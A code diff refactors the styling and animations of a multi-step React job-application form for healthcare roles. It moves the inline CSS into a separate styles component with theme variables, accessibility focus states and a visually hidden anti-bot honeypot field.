+            Apply for <span className="apply-title-accent">{selectedJob?.title || "Healthcare Role"}</span>
           </h1>
           {selectedJob && (
             <div className="apply-job-badge">
-              <span className="apply-job-location">{selectedJob.location}</span>
-              <span className="apply-job-pay">{selectedJob.pay}</span>
-              {selectedJob.urgent && (
-                <span className="apply-job-urgent">URGENT</span>
-              )}
+              <span className="apply-job-chip">{selectedJob.location}</span>
+              <span className="apply-job-chip apply-job-chip-pay">{selectedJob.pay}</span>
+              {selectedJob.urgent && <span className="apply-job-chip apply-job-chip-urgent">Urgent</span>}
             </div>
           )}
           <p className="apply-subtitle">
-            Complete the form below to apply for this position. Our team will review your application and get back to you within 2-3 business days.
+            Complete the form below to apply for this position. Our team will review your
+            application and get back to you within 2–3 business days.
           </p>
         </div>
 
@@ -826,28 +970,40 @@ export default function Apply() {
           <div className="apply-progress-steps">
             {[1, 2, 3].map((s) => (
               <div key={s} className="apply-progress-step">
-                <div className={`apply-progress-circle ${step >= s ? "active" : ""}`}>
+                <div className={`apply-progress-circle ${step >= s ? "active" : ""} ${step > s ? "done" : ""}`}>
                   {step > s ? <CheckCircle size={16} /> : s}
                 </div>
-                <span className="apply-progress-label">
-                  {s === 1 ? "Personal" : s === 2 ? "CV Upload" : "Review"}
+                <span className={`apply-progress-label ${step >= s ? "active" : ""}`}>
+                  {s === 1 ? "Personal" : s === 2 ? "CV upload" : "Review"}
                 </span>
               </div>
             ))}
           </div>
           <div className="apply-progress-bar">
-            <div className="apply-progress-bar-fill" style={{ width: `${((step - 1) / 2) * 100}%` }} />
+            <motion.div
+              className="apply-progress-bar-fill"
+              animate={{ width: `${((step - 1) / 2) * 100}%` }}
+              transition={{ duration: 0.4, ease: [0.16, 1, 0.3, 1] }}
+            />
           </div>
         </div>
 
-        {error && (
-          <div className="apply-error">
-            <AlertCircle size={18} />
-            <span>{error}</span>
-          </div>
-        )}
+        <AnimatePresence>
+          {error && (
+            <motion.div
+              className="apply-error"
+              initial={{ opacity: 0, height: 0, marginBottom: 0 }}
+              animate={{ opacity: 1, height: "auto", marginBottom: 20 }}
+              exit={{ opacity: 0, height: 0, marginBottom: 0 }}
+              role="alert"
+            >
+              <AlertCircle size={18} />
+              <span>{error}</span>
+            </motion.div>
+          )}
+        </AnimatePresence>
 
-        <form className="apply-form">
+        <form className="apply-form" onSubmit={(e) => e.preventDefault()} noValidate>
           <AnimatePresence mode="wait">
             {step === 1 && renderStep1()}
             {step === 2 && renderStep2()}
@@ -856,19 +1012,14 @@ export default function Apply() {
 
           {step < 3 && (
             <div className="apply-navigation">
-              <button
-                type="button"
-                onClick={prevStep}
-                className={step === 1 ? "apply-btn-hidden" : "apply-btn-secondary"}
-                style={{ visibility: step === 1 ? "hidden" : "visible" }}
-              >
-                Back
-              </button>
-              <button
-                type="button"
-                onClick={nextStep}
-                className="apply-btn-primary"
-              >
+              {step > 1 ? (
+                <button type="button" onClick={prevStep} className="apply-btn-secondary">
+                  Back
+                </button>
+              ) : (
+                <span />
+              )}
+              <button type="button" onClick={nextStep} className="apply-btn-primary">
                 Continue →
               </button>
             </div>
@@ -876,536 +1027,589 @@ export default function Apply() {
         </form>
 
         <div className="apply-footer">
+          <ShieldCheck size={14} className="apply-footer-icon" />
           <p>
             By submitting this application, you agree to our{" "}
-            <a href="#privacy" style={{ color: "#C4972A" }}>Privacy Policy</a>.
-            Your data will be used solely for recruitment purposes.
+            <a href="#privacy" className="apply-footer-link">Privacy Policy</a>. Your data is used
+            solely for recruitment purposes.
           </p>
         </div>
       </div>
 
-      <style>{`
-        .apply-page {
-          min-height: 100vh;
-          background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
-          padding: 80px 20px 60px;
-        }
-
-        .apply-container {
-          max-width: 720px;
-          margin: 0 auto;
-          background: #ffffff;
-          border-radius: 28px;
-          padding: 40px 36px;
-          box-shadow: 0 20px 60px rgba(15,29,61,0.08);
-          border: 1px solid rgba(0,0,0,0.04);
-        }
-
-        .apply-back-btn {
-          display: inline-flex;
-          align-items: center;
-          gap: 8px;
-          font-family: 'Inter', sans-serif;
-          font-size: 13px;
-          color: #64748b;
-          background: none;
-          border: none;
-          cursor: pointer;
-          padding: 8px 0;
-          margin-bottom: 20px;
-          transition: color 0.2s;
-        }
-        .apply-back-btn:hover { color: #0f1d3d; }
-
-        .apply-header { margin-bottom: 32px; }
-
-        .apply-title {
-          font-family: 'Inter', sans-serif;
-          font-size: 28px;
-          font-weight: 800;
-          color: #0f1d3d;
-          margin-bottom: 8px;
-        }
-
-        .apply-job-badge {
-          display: flex;
-          flex-wrap: wrap;
-          gap: 10px;
-          margin-bottom: 12px;
-        }
-
-        .apply-job-location {
-          font-size: 13px;
-          color: #64748b;
-          background: #f1f5f9;
-          padding: 4px 12px;
-          border-radius: 20px;
-        }
-        .apply-job-pay {
-          font-size: 13px;
-          color: #0f1d3d;
-          font-weight: 700;
-          background: #fefcf8;
-          padding: 4px 12px;
-          border-radius: 20px;
-          border: 1px solid rgba(196,151,42,0.2);
-        }
-        .apply-job-urgent {
-          font-size: 11px;
-          font-weight: 700;
-          color: #fff;
-          background: #ef4444;
-          padding: 4px 10px;
-          border-radius: 20px;
-        }
-
-        .apply-subtitle {
-          font-family: 'Inter', sans-serif;
-          font-size: 14px;
-          color: #64748b;
-          line-height: 1.6;
-          margin-top: 4px;
-        }
-
-        .apply-progress { margin-bottom: 32px; }
-        .apply-progress-steps {
-          display: flex;
-          justify-content: space-between;
-          position: relative;
-          z-index: 2;
-        }
-        .apply-progress-step {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          gap: 6px;
-        }
-        .apply-progress-circle {
-          width: 36px;
-          height: 36px;
-          border-radius: 50%;
-          background: #e2e8f0;
-          color: #94a3b8;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          font-family: 'Inter', sans-serif;
-          font-weight: 700;
-          font-size: 14px;
-          transition: all 0.3s;
-        }
-        .apply-progress-circle.active {
-          background: #C4972A;
-          color: #0f1d3d;
-          box-shadow: 0 4px 12px rgba(196,151,42,0.3);
-        }
-        .apply-progress-label {
-          font-family: 'Inter', sans-serif;
-          font-size: 10px;
-          color: #94a3b8;
-          font-weight: 600;
-          text-transform: uppercase;
-          letter-spacing: 0.5px;
-        }
-        .apply-progress-bar {
-          height: 3px;
-          background: #e2e8f0;
-          border-radius: 3px;
-          margin-top: -18px;
-          position: relative;
-          z-index: 1;
-        }
-        .apply-progress-bar-fill {
-          height: 100%;
-          background: linear-gradient(90deg, #C4972A, #f0c060);
-          border-radius: 3px;
-          transition: width 0.5s ease;
-        }
-
-        .apply-step { padding: 8px 0; }
-        .apply-step-title {
-          font-family: 'Inter', sans-serif;
-          font-size: 20px;
-          font-weight: 700;
-          color: #0f1d3d;
-          margin-bottom: 4px;
-        }
-        .apply-step-subtitle {
-          font-family: 'Inter', sans-serif;
-          font-size: 14px;
-          color: #64748b;
-          margin-bottom: 24px;
-        }
-
-        .apply-form-group {
-          margin-bottom: 18px;
-        }
-
-        .apply-label {
-          display: flex;
-          align-items: center;
-          gap: 6px;
-          font-family: 'Inter', sans-serif;
-          font-size: 13px;
-          font-weight: 600;
-          color: #334155;
-          margin-bottom: 6px;
-        }
-
-        .apply-input {
-          width: 100%;
-          padding: 12px 16px;
-          border-radius: 12px;
-          border: 1.5px solid #e2e8f0;
-          font-family: 'Inter', sans-serif;
-          font-size: 14px;
-          color: #0f1d3d;
-          background: #fafbfc;
-          transition: all 0.2s;
-          outline: none;
-        }
-        .apply-input:focus {
-          border-color: #C4972A;
-          background: #ffffff;
-          box-shadow: 0 0 0 4px rgba(196,151,42,0.08);
-        }
-        .apply-input::placeholder {
-          color: #94a3b8;
-        }
-
-        .apply-textarea {
-          min-height: 100px;
-          resize: vertical;
-        }
-
-        .apply-input select {
-          appearance: none;
-          background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2364748b' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
-          background-repeat: no-repeat;
-          background-position: right 16px center;
-          cursor: pointer;
-        }
-
-        .apply-upload-area {
-          border: 2px dashed #e2e8f0;
-          border-radius: 16px;
-          padding: 32px;
-          text-align: center;
-          transition: all 0.2s;
-          cursor: pointer;
-        }
-        .apply-upload-area:hover {
-          border-color: #C4972A;
-          background: #fefcf8;
-        }
-
-        .apply-upload-label {
-          cursor: pointer;
-          display: block;
-          width: 100%;
-        }
-
-        .apply-upload-content {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          gap: 8px;
-        }
-
-        .apply-upload-icon {
-          color: #C4972A;
-        }
-
-        .apply-upload-text {
-          font-family: 'Inter', sans-serif;
-          font-size: 14px;
-          font-weight: 600;
-          color: #0f1d3d;
-        }
-
-        .apply-upload-hint {
-          font-family: 'Inter', sans-serif;
-          font-size: 12px;
-          color: #94a3b8;
-        }
-
-        .apply-file-preview {
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          padding: 12px 16px;
-          background: #f1f5f9;
-          border-radius: 12px;
-        }
-
-        .apply-file-name {
-          font-family: 'Inter', sans-serif;
-          font-size: 13px;
-          font-weight: 500;
-          color: #0f1d3d;
-          flex: 1;
-        }
-
-        .apply-file-remove {
-          background: none;
-          border: none;
-          cursor: pointer;
-          color: #94a3b8;
-          padding: 4px;
-          transition: color 0.2s;
-        }
-        .apply-file-remove:hover { color: #ef4444; }
-
-        .apply-review-card {
-          background: #f8fafc;
-          border-radius: 16px;
-          padding: 24px;
-          border: 1px solid #e2e8f0;
-        }
-
-        .apply-review-section {
-          padding: 12px 0;
-          border-bottom: 1px solid #e2e8f0;
-        }
-        .apply-review-section:last-child { border-bottom: none; }
-
-        .apply-review-section h4 {
-          font-family: 'Inter', sans-serif;
-          font-size: 13px;
-          font-weight: 600;
-          color: #64748b;
-          text-transform: uppercase;
-          letter-spacing: 0.5px;
-          margin-bottom: 8px;
-        }
-
-        .apply-review-item {
-          display: flex;
-          justify-content: space-between;
-          padding: 4px 0;
-          font-family: 'Inter', sans-serif;
-          font-size: 14px;
-        }
-
-        .apply-review-label {
-          color: #94a3b8;
-        }
-
-        .apply-review-value {
-          color: #0f1d3d;
-          font-weight: 500;
-          text-align: right;
-        }
-
-        .apply-navigation {
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
-          margin-top: 28px;
-          padding-top: 24px;
-          border-top: 1px solid #e2e8f0;
-        }
-
-        .apply-btn-primary {
-          display: inline-flex;
-          align-items: center;
-          gap: 8px;
-          padding: 12px 32px;
-          border-radius: 40px;
-          background: linear-gradient(135deg, #C4972A, #8B6914);
-          color: #0f1d3d;
-          font-family: 'Inter', sans-serif;
-          font-weight: 700;
-          font-size: 14px;
-          border: none;
-          cursor: pointer;
-          transition: all 0.2s;
-          box-shadow: 0 4px 14px rgba(196,151,42,0.3);
-        }
-        .apply-btn-primary:hover {
-          transform: translateY(-2px);
-          box-shadow: 0 8px 24px rgba(196,151,42,0.4);
-        }
-        .apply-btn-primary:disabled {
-          opacity: 0.7;
-          cursor: not-allowed;
-          transform: none;
-        }
-
-        .apply-btn-secondary {
-          display: inline-flex;
-          align-items: center;
-          gap: 8px;
-          padding: 12px 28px;
-          border-radius: 40px;
-          background: transparent;
-          color: #0f1d3d;
-          font-family: 'Inter', sans-serif;
-          font-weight: 600;
-          font-size: 14px;
-          border: 1.5px solid #e2e8f0;
-          cursor: pointer;
-          transition: all 0.2s;
-        }
-        .apply-btn-secondary:hover {
-          background: #f8fafc;
-          border-color: #C4972A;
-        }
-
-        .apply-btn-hidden {
-          visibility: hidden;
-        }
-
-        .apply-error {
-          display: flex;
-          align-items: center;
-          gap: 10px;
-          padding: 12px 16px;
-          border-radius: 12px;
-          background: #fef2f2;
-          border: 1px solid #fecaca;
-          color: #dc2626;
-          font-family: 'Inter', sans-serif;
-          font-size: 13px;
-          margin-bottom: 20px;
-        }
-
-        .apply-thank-you {
-          text-align: center;
-          padding: 20px 0;
-        }
-
-        .apply-success-icon {
-          width: 72px;
-          height: 72px;
-          border-radius: 50%;
-          background: #ecfdf5;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          margin: 0 auto 20px;
-          color: #10b981;
-        }
-
-        .apply-success-title {
-          font-family: 'Inter', sans-serif;
-          font-size: 28px;
-          font-weight: 800;
-          color: #0f1d3d;
-          margin-bottom: 8px;
-        }
-
-        .apply-success-text {
-          font-family: 'Inter', sans-serif;
-          font-size: 15px;
-          color: #64748b;
-          max-width: 440px;
-          margin: 0 auto 24px;
-          line-height: 1.6;
-        }
-
-        .apply-success-card {
-          background: #f8fafc;
-          border-radius: 16px;
-          padding: 24px;
-          text-align: left;
-          margin-bottom: 28px;
-          border: 1px solid #e2e8f0;
-        }
-
-        .apply-success-card h4 {
-          font-family: 'Inter', sans-serif;
-          font-size: 15px;
-          font-weight: 700;
-          color: #0f1d3d;
-          margin-bottom: 12px;
-        }
-
-        .apply-success-list {
-          list-style: none;
-          padding: 0;
-          margin: 0;
-        }
-
-        .apply-success-list li {
-          font-family: 'Inter', sans-serif;
-          font-size: 14px;
-          color: #475569;
-          padding: 8px 0;
-          display: flex;
-          align-items: center;
-          gap: 10px;
-        }
-
-        .apply-success-buttons {
-          display: flex;
-          gap: 16px;
-          flex-wrap: wrap;
-          justify-content: center;
-          margin-top: 8px;
-        }
-
-        .apply-footer {
-          margin-top: 28px;
-          padding-top: 20px;
-          border-top: 1px solid #e2e8f0;
-          text-align: center;
-        }
-
-        .apply-footer p {
-          font-family: 'Inter', sans-serif;
-          font-size: 12px;
-          color: #94a3b8;
-        }
-
-        @media (max-width: 640px) {
-          .apply-container {
-            padding: 24px 18px;
-          }
-          .apply-title {
-            font-size: 22px;
-          }
-          .apply-job-badge {
-            gap: 6px;
-          }
-          .apply-progress-steps {
-            gap: 8px;
-          }
-          .apply-progress-label {
-            font-size: 8px;
-          }
-          .apply-navigation {
-            flex-direction: column-reverse;
-            gap: 12px;
-          }
-          .apply-navigation button {
-            width: 100%;
-            justify-content: center;
-          }
-          .apply-btn-secondary {
-            width: 100%;
-            justify-content: center;
-          }
-          .apply-review-item {
-            flex-direction: column;
-            gap: 2px;
-          }
-          .apply-review-value {
-            text-align: left;
-          }
-          .apply-upload-area {
-            padding: 20px;
-          }
-          .apply-success-buttons {
-            flex-direction: column;
-            align-items: center;
-          }
-          .apply-success-buttons button {
-            width: 100%;
-            justify-content: center;
-          }
-        }
-      `}</style>
+      <ApplyStyles />
     </div>
+  );
+}
+
+// Styles extracted to their own component purely so the JSX above stays
+// readable — behaviour is identical to having the <style> tag inline.
+function ApplyStyles() {
+  return (
+    <style>{`
+      :root {
+        --navy: #0f1d3d;
+        --navy-soft: #1a2d5a;
+        --gold: #C4972A;
+        --gold-deep: #8B6914;
+        --gold-light: #f0c060;
+        --ink: #0f1d3d;
+        --muted: #64748b;
+        --muted-soft: #94a3b8;
+        --line: #e2e8f0;
+        --surface: #fafbfc;
+        --surface-alt: #f8fafc;
+        --success: #10b981;
+        --danger: #dc2626;
+      }
+
+      .apply-page {
+        min-height: 100vh;
+        background:
+          radial-gradient(circle at 8% 0%, rgba(196,151,42,0.06), transparent 45%),
+          linear-gradient(180deg, #f8fafc 0%, #f1f5f9 100%);
+        padding: 88px 20px 64px;
+      }
+
+      .apply-container {
+        max-width: 720px;
+        margin: 0 auto;
+        background: #ffffff;
+        border-radius: 24px;
+        padding: 44px 40px;
+        box-shadow:
+          0 1px 2px rgba(15,29,61,0.04),
+          0 24px 64px -12px rgba(15,29,61,0.12);
+        border: 1px solid rgba(15,29,61,0.05);
+      }
+
+      .apply-back-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 7px;
+        font-family: 'Inter', sans-serif;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--muted);
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 6px 0;
+        margin-bottom: 24px;
+        transition: color 0.15s ease, transform 0.15s ease;
+      }
+      .apply-back-btn:hover { color: var(--navy); transform: translateX(-2px); }
+      .apply-back-btn:focus-visible {
+        outline: 2px solid var(--gold);
+        outline-offset: 4px;
+        border-radius: 4px;
+      }
+
+      .apply-header { margin-bottom: 36px; }
+
+      .apply-title {
+        font-family: 'Inter', sans-serif;
+        font-size: 30px;
+        line-height: 1.2;
+        font-weight: 800;
+        letter-spacing: -0.01em;
+        color: var(--navy);
+        margin-bottom: 12px;
+      }
+      .apply-title-accent { color: var(--gold-deep); }
+
+      .apply-job-badge {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-bottom: 14px;
+      }
+
+      .apply-job-chip {
+        font-family: 'Inter', sans-serif;
+        font-size: 12.5px;
+        font-weight: 600;
+        color: var(--muted);
+        background: var(--surface-alt);
+        padding: 5px 13px;
+        border-radius: 20px;
+        border: 1px solid var(--line);
+      }
+      .apply-job-chip-pay {
+        color: var(--navy);
+        background: #fefcf6;
+        border-color: rgba(196,151,42,0.25);
+      }
+      .apply-job-chip-urgent {
+        color: #fff;
+        background: #ef4444;
+        border-color: #ef4444;
+        text-transform: uppercase;
+        letter-spacing: 0.04em;
+        font-size: 11px;
+      }
+
+      .apply-subtitle {
+        font-family: 'Inter', sans-serif;
+        font-size: 14.5px;
+        color: var(--muted);
+        line-height: 1.65;
+      }
+
+      .apply-progress { margin-bottom: 36px; }
+      .apply-progress-steps {
+        display: flex;
+        justify-content: space-between;
+        position: relative;
+        z-index: 2;
+      }
+      .apply-progress-step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+      }
+      .apply-progress-circle {
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        background: #fff;
+        color: var(--muted-soft);
+        border: 2px solid var(--line);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: 'Inter', sans-serif;
+        font-weight: 700;
+        font-size: 13px;
+        transition: all 0.25s ease;
+      }
+      .apply-progress-circle.active {
+        background: var(--gold);
+        color: var(--navy);
+        border-color: var(--gold);
+        box-shadow: 0 0 0 4px rgba(196,151,42,0.15);
+      }
+      .apply-progress-circle.done {
+        background: var(--navy);
+        border-color: var(--navy);
+        color: #fff;
+      }
+      .apply-progress-label {
+        font-family: 'Inter', sans-serif;
+        font-size: 10.5px;
+        color: var(--muted-soft);
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        transition: color 0.25s ease;
+      }
+      .apply-progress-label.active { color: var(--navy); }
+
+      .apply-progress-bar {
+        height: 3px;
+        background: var(--line);
+        border-radius: 3px;
+        margin-top: -17px;
+        position: relative;
+        z-index: 1;
+        overflow: hidden;
+      }
+      .apply-progress-bar-fill {
+        height: 100%;
+        background: linear-gradient(90deg, var(--gold), var(--gold-light));
+        border-radius: 3px;
+      }
+
+      .apply-step { padding: 4px 0; }
+      .apply-step-title {
+        font-family: 'Inter', sans-serif;
+        font-size: 19px;
+        font-weight: 700;
+        color: var(--navy);
+        margin-bottom: 5px;
+        letter-spacing: -0.005em;
+      }
+      .apply-step-subtitle {
+        font-family: 'Inter', sans-serif;
+        font-size: 13.5px;
+        color: var(--muted);
+        margin-bottom: 26px;
+        line-height: 1.5;
+      }
+
+      .apply-form-group { margin-bottom: 18px; }
+
+      .apply-label {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-family: 'Inter', sans-serif;
+        font-size: 13px;
+        font-weight: 600;
+        color: #334155;
+        margin-bottom: 7px;
+      }
+      .apply-required { color: var(--gold-deep); }
+      .apply-optional {
+        font-weight: 400;
+        color: var(--muted-soft);
+        font-size: 12px;
+      }
+
+      .apply-input {
+        width: 100%;
+        padding: 12px 16px;
+        border-radius: 11px;
+        border: 1.5px solid var(--line);
+        font-family: 'Inter', sans-serif;
+        font-size: 14px;
+        color: var(--navy);
+        background: var(--surface);
+        transition: border-color 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
+        outline: none;
+      }
+      .apply-input:focus-visible {
+        border-color: var(--gold);
+        background: #ffffff;
+        box-shadow: 0 0 0 4px rgba(196,151,42,0.1);
+      }
+      .apply-input::placeholder { color: var(--muted-soft); }
+
+      .apply-select {
+        appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2364748b' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 16px center;
+        cursor: pointer;
+      }
+
+      .apply-textarea { min-height: 100px; resize: vertical; }
+      .apply-char-count {
+        display: block;
+        text-align: right;
+        font-family: 'Inter', sans-serif;
+        font-size: 11px;
+        color: var(--muted-soft);
+        margin-top: 4px;
+      }
+
+      .apply-upload-area {
+        width: 100%;
+        border: 2px dashed var(--line);
+        border-radius: 16px;
+        padding: 30px 20px;
+        text-align: center;
+        background: var(--surface-alt);
+        transition: border-color 0.2s ease, background 0.2s ease, transform 0.15s ease;
+        cursor: pointer;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+      }
+      .apply-upload-area:hover:not(:disabled) {
+        border-color: var(--gold);
+        background: #fefcf6;
+      }
+      .apply-upload-area:focus-visible {
+        outline: 2px solid var(--gold);
+        outline-offset: 2px;
+      }
+      .apply-upload-area:disabled { cursor: not-allowed; opacity: 0.75; }
+
+      .apply-upload-icon { color: var(--gold-deep); }
+      .apply-upload-text {
+        font-family: 'Inter', sans-serif;
+        font-size: 14px;
+        font-weight: 600;
+        color: var(--navy);
+      }
+      .apply-upload-hint {
+        font-family: 'Inter', sans-serif;
+        font-size: 12px;
+        color: var(--muted-soft);
+      }
+
+      .apply-file-preview {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 13px 16px;
+        background: #f0fdf4;
+        border: 1.5px solid #bbf7d0;
+        border-radius: 12px;
+      }
+      .apply-file-icon { color: var(--success); display: flex; }
+      .apply-file-name {
+        font-family: 'Inter', sans-serif;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--navy);
+        flex: 1;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      .apply-file-remove {
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: var(--muted-soft);
+        padding: 4px;
+        display: flex;
+        border-radius: 6px;
+        transition: color 0.15s ease, background 0.15s ease;
+      }
+      .apply-file-remove:hover { color: var(--danger); background: rgba(220,38,38,0.08); }
+
+      /* SECURITY: honeypot field — hidden from sighted users and keyboard
+         tab order without using display:none (some bots specifically skip
+         display:none / visibility:hidden fields when filling forms). */
+      .apply-honeypot {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        overflow: hidden;
+        clip: rect(0 0 0 0);
+        white-space: nowrap;
+        left: -9999px;
+      }
+
+      .apply-review-card {
+        background: var(--surface-alt);
+        border-radius: 16px;
+        padding: 22px 24px;
+        border: 1px solid var(--line);
+      }
+      .apply-review-section {
+        padding: 13px 0;
+        border-bottom: 1px solid var(--line);
+      }
+      .apply-review-section:first-child { padding-top: 0; }
+      .apply-review-section:last-child { border-bottom: none; padding-bottom: 0; }
+
+      .apply-review-section h4 {
+        font-family: 'Inter', sans-serif;
+        font-size: 12px;
+        font-weight: 700;
+        color: var(--muted);
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        margin-bottom: 9px;
+      }
+
+      .apply-review-item {
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+        padding: 4px 0;
+        font-family: 'Inter', sans-serif;
+        font-size: 13.5px;
+      }
+      .apply-review-label { color: var(--muted-soft); flex-shrink: 0; }
+      .apply-review-value {
+        color: var(--navy);
+        font-weight: 500;
+        text-align: right;
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .apply-review-highlight { color: var(--gold-deep); font-weight: 700; }
+      .apply-review-success { color: var(--success); }
+      .apply-review-link {
+        color: var(--gold-deep);
+        text-decoration: none;
+        font-weight: 600;
+      }
+      .apply-review-link:hover { text-decoration: underline; }
+
+      .apply-review-actions {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin-top: 26px;
+      }
+
+      .apply-navigation {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 30px;
+        padding-top: 26px;
+        border-top: 1px solid var(--line);
+      }
+
+      .apply-btn-primary {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px 30px;
+        border-radius: 40px;
+        background: linear-gradient(135deg, var(--gold), var(--gold-deep));
+        color: var(--navy);
+        font-family: 'Inter', sans-serif;
+        font-weight: 700;
+        font-size: 14px;
+        border: none;
+        cursor: pointer;
+        transition: transform 0.15s ease, box-shadow 0.15s ease;
+        box-shadow: 0 4px 14px rgba(196,151,42,0.28);
+      }
+      .apply-btn-primary:hover:not(:disabled) {
+        transform: translateY(-1px);
+        box-shadow: 0 8px 22px rgba(196,151,42,0.36);
+      }
+      .apply-btn-primary:focus-visible {
+        outline: 2px solid var(--navy);
+        outline-offset: 3px;
+      }
+      .apply-btn-primary:disabled { opacity: 0.65; cursor: not-allowed; transform: none; }
+
+      .apply-btn-secondary {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px 26px;
+        border-radius: 40px;
+        background: transparent;
+        color: var(--navy);
+        font-family: 'Inter', sans-serif;
+        font-weight: 600;
+        font-size: 14px;
+        border: 1.5px solid var(--line);
+        cursor: pointer;
+        transition: border-color 0.15s ease, background 0.15s ease;
+      }
+      .apply-btn-secondary:hover { background: var(--surface-alt); border-color: var(--gold); }
+      .apply-btn-secondary:focus-visible { outline: 2px solid var(--gold); outline-offset: 2px; }
+
+      .apply-error {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 13px 16px;
+        border-radius: 12px;
+        background: #fef2f2;
+        border: 1px solid #fecaca;
+        color: var(--danger);
+        font-family: 'Inter', sans-serif;
+        font-size: 13px;
+        overflow: hidden;
+      }
+
+      .apply-thank-you { text-align: center; padding: 12px 0; }
+
+      .apply-success-icon {
+        width: 68px;
+        height: 68px;
+        border-radius: 50%;
+        background: #ecfdf5;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 22px;
+        color: var(--success);
+      }
+
+      .apply-success-title {
+        font-family: 'Inter', sans-serif;
+        font-size: 26px;
+        font-weight: 800;
+        color: var(--navy);
+        margin-bottom: 10px;
+        letter-spacing: -0.01em;
+      }
+
+      .apply-success-text {
+        font-family: 'Inter', sans-serif;
+        font-size: 14.5px;
+        color: var(--muted);
+        max-width: 420px;
+        margin: 0 auto 26px;
+        line-height: 1.65;
+      }
+
+      .apply-success-card {
+        background: var(--surface-alt);
+        border-radius: 16px;
+        padding: 24px;
+        text-align: left;
+        margin-bottom: 28px;
+        border: 1px solid var(--line);
+      }
+      .apply-success-card h4 {
+        font-family: 'Inter', sans-serif;
+        font-size: 14px;
+        font-weight: 700;
+        color: var(--navy);
+        margin-bottom: 13px;
+      }
+
+      .apply-success-list { list-style: none; padding: 0; margin: 0; }
+      .apply-success-list li {
+        font-family: 'Inter', sans-serif;
+        font-size: 13.5px;
+        color: #475569;
+        padding: 7px 0;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .apply-success-list-icon { color: var(--gold-deep); flex-shrink: 0; }
+
+      .apply-success-buttons {
+        display: flex;
+        gap: 14px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .apply-footer {
+        margin-top: 30px;
+        padding-top: 22px;
+        border-top: 1px solid var(--line);
+        display: flex;
+        align-items: flex-start;
+        justify-content: center;
+        gap: 6px;
+        text-align: center;
+      }
+      .apply-footer-icon { color: var(--muted-soft); margin-top: 1px; flex-shrink: 0; }
+      .apply-footer p {
+        font-family: 'Inter', sans-serif;
+        font-size: 12px;
+        color: var(--muted-soft);
+        line-height: 1.5;
+      }
+      .apply-footer-link { color: var(--gold-deep); font-weight: 600; }
+
+      .apply-spin { animation: apply-spin 0.9s linear infinite; }
+      @keyframes apply-spin {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        .apply-spin { animation-duration: 2s; }
+      }
+
+      @media (max-width: 640px) {
+        .apply-page { padding: 72px 14px 48px; }
+        .apply-container { padding: 28px 20px; border-radius: 20px; }
+        .apply-title { font-size: 23px; }
+        .apply-job-badge { gap: 6px; }
+        .apply-progress-label { font-size: 9px; }
+        .apply-navigation { flex-direction: column-reverse; gap: 12px; }
+        .apply-navigation button { width: 100%; }
+        .apply-review-actions { flex-direction: column-reverse; }
+        .apply-review-actions button { width: 100%; }
+        .apply-review-item { flex-direction: column; gap: 2px; }
+        .apply-review-value { text-align: left; }
+        .apply-success-buttons { flex-direction: column; align-items: stretch; }
+      }
+    `}</style>
   );
 }
